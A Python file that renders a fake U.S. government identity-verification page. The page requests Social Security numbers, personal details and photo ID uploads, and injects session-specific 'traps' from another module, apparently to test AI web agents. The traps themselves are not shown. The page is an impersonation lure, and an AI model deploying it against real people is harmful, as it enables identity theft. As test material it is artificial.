from .traps import inject_traps, BASE_URL


def render_government(session_id: str, selected_traps: list) -> str:
    traps_html = inject_traps(session_id, selected_traps)

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U.S. Department of Digital Services - Identity Verification</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Source+Serif+Pro:wght@400;600;700&family=Public+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: 'Public Sans', sans-serif; 
            background: #f5f5f5; 
            color: #1a1a1a;
            line-height: 1.6;
        }}
        
        /* Official Banner */
        .official-banner {{
            background: #1a4480;
            color: white;
            font-size: 13px;
        }}
        .banner-content {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 8px 20px;
            display: flex;
            align-items: center;
            gap: 12px;
        }}
        .banner-flag {{ font-size: 16px; }}
        .banner-link {{
            color: white;
            text-decoration: underline;
            cursor: pointer;
        }}

        /* Header */
        .header {{
            background: white;
            border-bottom: 1px solid #ddd;
            padding: 20px 0;
        }}
        .header-content {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }}
        .agency-logo {{
            display: flex;
            align-items: center;
            gap: 16px;
        }}
        .agency-seal {{
            width: 60px;
            height: 60px;
            background: #1a4480;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
        }}
        .agency-name {{
            font-family: 'Source Serif Pro', serif;
            font-size: 20px;
            font-weight: 700;
            color: #1a4480;
        }}
        .header-actions {{
            display: flex;
            align-items: center;
            gap: 20px;
        }}
        .search-box {{
            display: flex;
            align-items: center;
        }}
        .search-box input {{
            padding: 10px 16px;
            border: 1px solid #ccc;
            border-radius: 4px 0 0 4px;
            font-size: 14px;
            width: 240px;
        }}
        .search-box button {{
            padding: 10px 16px;
            background: #005ea2;
            color: white;
            border: none;
            border-radius: 0 4px 4px 0;
            cursor: pointer;
        }}
        .language-selector {{
            display: flex;
            gap: 8px;
            font-size: 14px;
        }}
        .language-selector a {{
            color: #1a4480;
            text-decoration: none;
        }}
        .language-selector span {{ color: #999; }}

        /* Navigation */
        .nav-bar {{
            background: #005ea2;
            padding: 0;
        }}
        .nav-content {{
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
        }}
        .nav-content a {{
            color: white;
            text-decoration: none;
            padding: 14px 24px;
            font-size: 15px;
            font-weight: 500;
        }}
        .nav-content a:hover {{
            background: #004a80;
        }}

        /* Main Content */
        .main-content {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
            display: grid;
            grid-template-columns: 1fr 300px;
            gap: 40px;
        }}

        /* Breadcrumb */
        .breadcrumb {{
            grid-column: 1 / -1;
            font-size: 14px;
            color: #666;
            margin-bottom: 8px;
        }}
        .breadcrumb a {{
            color: #005ea2;
            text-decoration: none;
        }}

        /* Page Title */
        .page-title {{
            grid-column: 1 / -1;
            font-family: 'Source Serif Pro', serif;
            font-size: 36px;
            color: #1a1a1a;
            margin-bottom: 8px;
        }}
        .page-subtitle {{
            grid-column: 1 / -1;
            font-size: 18px;
            color: #666;
            margin-bottom: 24px;
        }}

        /* Alert Box */
        .alert-box {{
            grid-column: 1 / -1;
            background: #e7f3ff;
            border-left: 4px solid #005ea2;
            padding: 16px 20px;
            margin-bottom: 32px;
            border-radius: 0 4px 4px 0;
        }}
        .alert-title {{
            font-weight: 600;
            color: #1a4480;
            margin-bottom: 4px;
        }}
        .alert-content {{
            font-size: 14px;
            color: #333;
        }}

        /* Step Progress */
        .step-progress {{
            grid-column: 1 / -1;
            display: flex;
            align-items: center;
            gap: 0;
            margin-bottom: 32px;
        }}
        .step {{
            display: flex;
            align-items: center;
            gap: 8px;
        }}
        .step-number {{
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #005ea2;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 14px;
        }}
        .step.completed .step-number {{
            background: #00a91c;
        }}
        .step-label {{
            font-size: 14px;
            color: #666;
            margin-right: 24px;
        }}
        .step.completed .step-label {{
            color: #00a91c;
        }}
        .step-connector {{
            width: 40px;
            height: 2px;
            background: #ddd;
        }}

        /* Form */
        .form-container {{
            background: white;
            border-radius: 8px;
            padding: 32px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }}
        .form-section-title {{
            font-family: 'Source Serif Pro', serif;
            font-size: 22px;
            color: #1a1a1a;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid #eee;
        }}
        .form-grid {{
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        .form-group.full-width {{
            grid-column: 1 / -1;
        }}
        .form-label {{
            display: block;
            font-size: 15px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 8px;
        }}
        .required {{
            color: #d53f3f;
        }}
        .form-input {{
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            font-family: inherit;
        }}
        .form-input:focus {{
            outline: 2px solid #005ea2;
            border-color: #005ea2;
        }}
        .form-hint {{
            font-size: 13px;
            color: #666;
            margin-top: 6px;
        }}

        /* Upload Section */
        .upload-section {{
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid #eee;
        }}
        .upload-title {{
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 16px;
        }}
        .upload-zone {{
            border: 2px dashed #ccc;
            border-radius: 8px;
            padding: 40px;
            text-align: center;
            background: #fafafa;
            cursor: pointer;
        }}
        .upload-zone:hover {{
            border-color: #005ea2;
            background: #f0f7ff;
        }}
        .upload-icon {{
            font-size: 48px;
            margin-bottom: 16px;
        }}
        .upload-text {{
            font-size: 15px;
            color: #666;
        }}

        /* Navigation Buttons */
        .form-navigation {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #eee;
        }}
        .btn {{
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }}
        .btn-secondary {{
            background: white;
            color: #005ea2;
            border: 1px solid #005ea2;
        }}
        .btn-primary {{
            background: #005ea2;
            color: white;
            border: none;
        }}
        .btn-group {{
            display: flex;
            gap: 12px;
        }}

        /* Sidebar */
        .sidebar {{
            display: flex;
            flex-direction: column;
            gap: 24px;
        }}
        .sidebar-card {{
            background: white;
            border-radius: 8px;
            padding: 24px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }}
        .sidebar-title {{
            font-family: 'Source Serif Pro', serif;
            font-size: 18px;
            color: #1a4480;
            margin-bottom: 16px;
        }}
        .help-phone {{
            font-size: 24px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 8px;
        }}
        .help-hours {{
            font-size: 14px;
            color: #666;
        }}
        .expect-list {{
            list-style: none;
        }}
        .expect-list li {{
            padding: 12px 0;
            border-bottom: 1px solid #eee;
            font-size: 14px;
        }}
        .expect-list li:last-child {{
            border-bottom: none;
        }}
        .expect-list li::before {{
            content: '✓';
            color: #00a91c;
            font-weight: 700;
            margin-right: 8px;
        }}
        .accordion {{
            margin-top: 16px;
        }}
        .accordion-item {{
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-bottom: 8px;
        }}
        .accordion-header {{
            padding: 12px 16px;
            background: #f5f5f5;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
        }}

        /* Footer */
        .footer {{
            background: #1a1a1a;
            color: #999;
            padding: 40px 20px;
            margin-top: 60px;
        }}
        .footer-content {{
            max-width: 1200px;
            margin: 0 auto;
        }}
        .footer-links {{
            display: flex;
            flex-wrap: wrap;
            gap: 24px;
            margin-bottom: 24px;
        }}
        .footer-links a {{
            color: #999;
            text-decoration: none;
            font-size: 14px;
        }}
        .footer-links a:hover {{
            color: white;
        }}
        .footer-bottom {{
            display: flex;
            align-items: center;
            gap: 24px;
            padding-top: 24px;
            border-top: 1px solid #333;
        }}
        .footer-logo {{
            font-size: 24px;
        }}
    </style>
    {traps_html}
</head>
<body>
    <div class="official-banner">
        <div class="banner-content">
            <span class="banner-flag">🇺🇸</span>
            <span>An official website of the United States government</span>
            <span class="banner-link">Here's how you know ▾</span>
        </div>
    </div>

    <header class="header">
        <div class="header-content">
            <div class="agency-logo">
                <div class="agency-seal">🏛</div>
                <div class="agency-name">U.S. Department of Digital Services</div>
            </div>
            <div class="header-actions">
                <div class="search-box">
                    <input type="text" placeholder="Search...">
                    <button type="button">🔍</button>
                </div>
                <div class="language-selector">
                    <a href="#">EN</a>
                    <span>|</span>
                    <a href="#">ES</a>
                    <span>|</span>
                    <a href="#">ZH</a>
                </div>
            </div>
        </div>
    </header>

    <nav class="nav-bar">
        <div class="nav-content">
            <a href="#">Home</a>
            <a href="#">Services</a>
            <a href="#">Forms</a>
            <a href="#">Check Status</a>
            <a href="#">Contact</a>
        </div>
    </nav>

    <main class="main-content">
        <div class="breadcrumb">
            <a href="#">Home</a> > <a href="#">Services</a> > Identity Verification
        </div>

        <h1 class="page-title">Identity Verification Request</h1>
        <p class="page-subtitle">Form DS-4892</p>

        <div class="alert-box">
            <div class="alert-title">Processing Time</div>
            <div class="alert-content">
                Processing times are currently 5-7 business days. You will receive confirmation via email once your request is processed.
            </div>
        </div>

        <div class="step-progress">
            <div class="step completed">
                <div class="step-number">1</div>
                <span class="step-label">Personal Info</span>
            </div>
            <div class="step-connector"></div>
            <div class="step">
                <div class="step-number">2</div>
                <span class="step-label">Identity Docs</span>
            </div>
            <div class="step-connector"></div>
            <div class="step">
                <div class="step-number">3</div>
                <span class="step-label">Review</span>
            </div>
            <div class="step-connector"></div>
            <div class="step">
                <div class="step-number">4</div>
                <span class="step-label">Submit</span>
            </div>
        </div>

        <div class="form-container">
            <h2 class="form-section-title">Identity Documents</h2>
            <form id="identity-form">
                <div class="form-grid">
                    <div class="form-group">
                        <label class="form-label">Legal First Name <span class="required">*</span></label>
                        <input type="text" class="form-input" name="first_name" placeholder="As shown on your ID">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Legal Last Name <span class="required">*</span></label>
                        <input type="text" class="form-input" name="last_name" placeholder="As shown on your ID">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Date of Birth <span class="required">*</span></label>
                        <input type="text" class="form-input" name="dob" placeholder="MM/DD/YYYY">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Social Security Number <span class="required">*</span></label>
                        <input type="text" class="form-input" name="ssn" placeholder="___-__-____" maxlength="11">
                    </div>
                    <div class="form-group full-width">
                        <label class="form-label">Current Address <span class="required">*</span></label>
                        <input type="text" class="form-input" name="address" placeholder="Street Address">
                    </div>
                    <div class="form-group">
                        <label class="form-label">City <span class="required">*</span></label>
                        <input type="text" class="form-input" name="city">
                    </div>
                    <div class="form-group">
                        <label class="form-label">State <span class="required">*</span></label>
                        <select class="form-input" name="state">
                            <option value="">Select State</option>
                            <option value="AL">Alabama</option>
                            <option value="CA">California</option>
                            <option value="NY">New York</option>
                            <option value="TX">Texas</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">ZIP Code <span class="required">*</span></label>
                        <input type="text" class="form-input" name="zip" maxlength="5">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Email Address <span class="required">*</span></label>
                        <input type="email" class="form-input" name="email">
                    </div>
                    <div class="form-group full-width">
                        <label class="form-label">Phone Number <span class="required">*</span></label>
                        <input type="tel" class="form-input" name="phone" placeholder="(555) 123-4567">
                    </div>
                </div>

                <div class="upload-section">
                    <h3 class="upload-title">Upload Government-Issued Photo ID</h3>
                    <div class="upload-zone">
                        <div class="upload-icon">📁</div>
                        <div class="upload-text">
                            Drag and drop your file here, or click to browse<br>
                            <span style="font-size: 13px; color: #999;">Accepted formats: PDF, JPG, PNG (Max 10MB)</span>
                        </div>
                    </div>
                </div>

                <div class="upload-section">
                    <h3 class="upload-title">Upload Supporting Document (Optional)</h3>
                    <div class="upload-zone">
                        <div class="upload-icon">📁</div>
                        <div class="upload-text">
                            Drag and drop your file here, or click to browse<br>
                            <span style="font-size: 13px; color: #999;">Utility bill, bank statement, or lease agreement</span>
                        </div>
                    </div>
                </div>

                <div class="form-navigation">
                    <a href="#" class="btn btn-secondary">← Previous</a>
                    <div class="btn-group">
                        <button type="button" class="btn btn-secondary">Save Progress</button>
                        <button type="submit" class="btn btn-primary">Continue →</button>
                    </div>
                </div>
            </form>
        </div>

        <aside class="sidebar">
            <div class="sidebar-card">
                <h3 class="sidebar-title">Need Help?</h3>
                <div class="help-phone">1-800-555-0199</div>
                <div class="help-hours">Mon-Fri 8am-6pm ET</div>
            </div>

            <div class="sidebar-card">
                <h3 class="sidebar-title">What to Expect</h3>
                <ul class="expect-list">
                    <li>Submit your application online</li>
                    <li>Receive confirmation email</li>
                    <li>Wait for document review (5-7 days)</li>
                    <li>Receive verification decision</li>
                    <li>Download your verification letter</li>
                </ul>
            </div>

            <div class="sidebar-card">
                <h3 class="sidebar-title">Privacy Act Notice</h3>
                <p style="font-size: 14px; color: #666;">
                    The information you provide is protected under the Privacy Act of 1974.
                </p>
                <div class="accordion">
                    <div class="accordion-item">
                        <div class="accordion-header">View Full Notice ▾</div>
                    </div>
                </div>
            </div>
        </aside>
    </main>

    <footer class="footer">
        <div class="footer-content">
            <div class="footer-links">
                <a href="#">FOIA</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Accessibility</a>
                <a href="#">No FEAR Act</a>
                <a href="#">Inspector General</a>
                <a href="#">USA.gov</a>
            </div>
            <div class="footer-bottom">
                <span class="footer-logo">🇺🇸</span>
                <span>U.S. Department of Digital Services</span>
            </div>
        </div>
    </footer>
</body>
</html>
'''
